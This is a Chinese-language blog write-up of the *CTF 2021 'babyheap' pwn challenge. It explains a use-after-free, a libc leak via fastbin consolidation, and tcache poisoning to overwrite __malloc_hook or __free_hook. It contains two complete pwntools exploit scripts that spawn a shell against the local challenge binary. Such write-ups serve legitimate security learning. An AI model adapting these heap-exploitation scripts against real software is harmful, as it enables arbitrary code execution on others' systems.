---
title:  2021*CTF_PWN_babyheap复现记
categories: [CTF]
tags: [pwn]

---

最近查阅了很多关于堆的资料，也做了很多关于堆的题。慢慢开始回顾下那年没有被啃动的pwn 堆题。

babyheap是当时*CTF 2021中最简单的pwn，但是当时做堆还一窍不通，一直搞不懂堆的机制关系。如今再细细分析发现还挺有意思的。<!--more-->

## 题目分析

题目保护全开:

分析逆向后的代码可以看到:

add 函数限制了我们只能申请0x20~0x70大小的chunk(刚开始没有反映过来0x60>0x60的结果为false),且只能申请15个.

![image-20210427214048652](image-20210427214048652.png)

edit和delete在调有时看起来只要pools有值就可以free后依然可以调用.在delete时,在add中所创造的pools[v1]与sizes[v1]在,没有新的值覆盖下不会被清空的.这样我们可以在一个chunk free后依然可以操控.

![image-20210427213937736](image-20210427213937736.png)

![image-20210427214135176](image-20210427214135176.png)

在leaveYouname函数中,会创造一个大的chunk 会触发`_int_malloc`中的`malloc_consolidate`进行fast bin的合并.但该函数只能运行一次.

![image-20210427214211389](image-20210427214211389.png)

## 解题过程

由于chunk free后加入bins fd指针起到重要的作用,但是edit限制了我们修改fd.

但分析过程可以得知我们可以先填满Tcache,然后创造几个fast bin,然后利用leaveYouname进行合并,从而得到一个smallbins从而泄露出libc的基地址.

![image-20210427222140086](image-20210427222140086.png)

由于,在有tache bin 与small bins下我们申请malloc 一个chunk,程序会先对tache bin中的chunk 进行查询再从samllbins切割分配.我们可以创造几个大小合理且不在tache bin中的chunk,从而让程序分配切割smallbins。

![image-20210427224028856](image-20210427224028856.png)

同时，我们再利用free后依然可以调用edit的特性，修改新分配再释放的chunk的fd。

这里有个特性：加入tachebins 后，tachebins 没有在它出去时，检查地址对于'chunk'的size是否还是加入时的大小和地址。导致tachbins里地址可以被窜改后，然后取出时分配到窜改后的地址的地方。（ps：tachbins 存放的是chunk 内容的地址）

![image-20210427224943217](image-20210427224943217.png)

我们可以将`__malloc_hook`-0x10的地址从而得到`__malloc_hook`和`__realloc_hook`写的权利，修改写入one_gadget和`__libc_realloc`调节，从而得到shell。

完整exp：

```python
from pwn import *
from LibcSearcher import LibcSearcher
e=ELF('/glibc/2.27/amd64/lib/libc.so.6')

p=process('./1pwn')


def add(num,size):
	p.sendline('1')
	p.recvuntil('input index')
	p.sendline(str(num))
	p.recvuntil('input size')
	p.sendline(str(size))



def free(num):

	p.sendline('2')
	p.recvuntil('input index')
	p.sendline(str(num))

def edit(num,text):

	p.sendline('3')
	p.recvuntil('input index')
	p.sendline(str(num))
	p.recvuntil('input content')
	p.send(text)

def show(num):
	p.sendline('4')
	p.recvuntil('input index')
	p.sendline(str(num))


def leaveYourName(text):
	p.sendline('5')
	p.recvuntil('your name:')
	p.sendline(text)

def showYourName(text):
	p.sendline('6')


add(0,0x59)

add(1,0x28)
edit(1,'wwww\n')
add(2,0x58)
edit(2,'wwww\n')
free(0)
add(3,0x59)
for i in range(7):
	add(i+4,0x58)
for i in range(7):
	free(i+4)
for i in range(7):
	add(i+4,0x59)
for i in range(7):
	free(i+4)
for i in range(7):
	add(i+4,0x28)
for i in range(7):
	free(i+4)

free(0)
free(1)
leaveYourName('k'*4)

show(7)

caddr=u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00'))-0x970# 本来想直接给tachet结果发现搞复杂了

log.info(':'+hex(caddr))
show(1)


addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96

log.info('main_arena:'+hex(addr))

base=addr-0x3afc40
log.info('base:'+hex(base))



add(10,0x18)
edit(10,'1111')

add(11,0x18)
free(11)

log.info('__malloc_hook:'+hex(base))
edit(0,p64(0)*2+p64(0x21)+p64(base+e.symbols['__malloc_hook']-0x10))
add(11,0x18)
edit(11,'kkkk')
add(12,0x18)
gdb.attach(p)
"""
0x41612 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x41666 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xdeed2 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

"""
edit(12,p64(base+0xdeed2)+p64(base+e.symbols['__libc_realloc']+4))
#gdb.attach(p)
add(3,0x20)
 
p.interactive()
```

## Glibc 2.27关于Tcache的增强保护

查询wp后才知道，这题是考在2020年09月10日Ubuntu基金更新的名为2.27-3ubuntu1.3的libc。

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
        /* Check to see if it's already in the tcache.  */
        tcache_entry *e = (tcache_entry *) chunk2mem (p);

        /* This test succeeds on double free.  However, we don't 100%
           trust it (it also matches random payload data at a 1 in
           2^<size_t> chance), so verify it's not an unlikely
           coincidence before aborting.  */
        if (__glibc_unlikely (e->key == tcache))
          {
            tcache_entry *tmp;
            LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
            for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
              if (tmp == e)
                malloc_printerr ("free(): double free detected in tcache 2");
                /* If we get here, it was a coincidence.  We've wasted a
                   few cycles, but don't abort.  */
          }

        if (tcache->counts[tc_idx] < mp_.tcache_count)
          {
            tcache_put (p, tc_idx);
            return;
          }
      }
  }
#endif
```

主要是针对tache bins 二次释放的，但是这题fd 不好被控制，edit不能改一当前chunk的fd，自己在昨天实际就默认忽略这思路（雾）

更多具体可以看：

https://www.anquanke.com/post/id/219292#h3-7

## 另一思路

看了大佬的wp发现这题free处指向我们能控制chunk内容的chunk，我们可以修改free_hook写入system 从而写shell。

exp：

```python
from pwn import *
from LibcSearcher import LibcSearcher
e=ELF('/glibc/2.27/amd64/lib/libc.so.6')

p=process('./1pwn')


def add(num,size):
	p.sendline('1')
	p.recvuntil('input index')
	p.sendline(str(num))
	p.recvuntil('input size')
	p.sendline(str(size))



def free(num):

	p.sendline('2')
	p.recvuntil('input index')
	p.sendline(str(num))

def edit(num,text):

	p.sendline('3')
	p.recvuntil('input index')
	p.sendline(str(num))
	p.recvuntil('input content')
	p.send(text)

def show(num):
	p.sendline('4')
	p.recvuntil('input index')
	p.sendline(str(num))


def leaveYourName(text):
	p.sendline('5')
	p.recvuntil('your name:')
	p.sendline(text)

def showYourName(text):
	p.sendline('6')


add(0,0x59)

add(1,0x28)
edit(1,'wwww\n')
add(2,0x58)
edit(2,'wwww\n')
free(0)
add(3,0x59)
for i in range(7):
	add(i+4,0x58)
for i in range(7):
	free(i+4)
for i in range(7):
	add(i+4,0x59)
for i in range(7):
	free(i+4)
for i in range(7):
	add(i+4,0x28)
for i in range(7):
	free(i+4)

free(0)
free(1)
leaveYourName('k'*4)

show(7)
caddr=u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00'))-0x970
log.info(':'+hex(caddr))
show(1)


addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-96

log.info('main_arena:'+hex(addr))

base=addr-0x3afc40
log.info('base:'+hex(base))


add(10,0x10)

add(11,0x10)
free(11)
edit(0,p64(0)*2+p64(0x21)+p64(base+e.symbols['__free_hook']-0x8))
add(11,0x10)
add(11,0x10)

edit(11,p64(base+e.symbols['system']))

add(11,0x10)

edit(0,p64(0)*2+p64(0x21)+p64(0)*3+p64(0x21)+'/bin/sh\x00')
gdb.attach(p)
free(11)
p.interactive()
```

## 参考文献

https://www.anquanke.com/post/id/219292

https://www.cnblogs.com/lemon629/p/14327460.html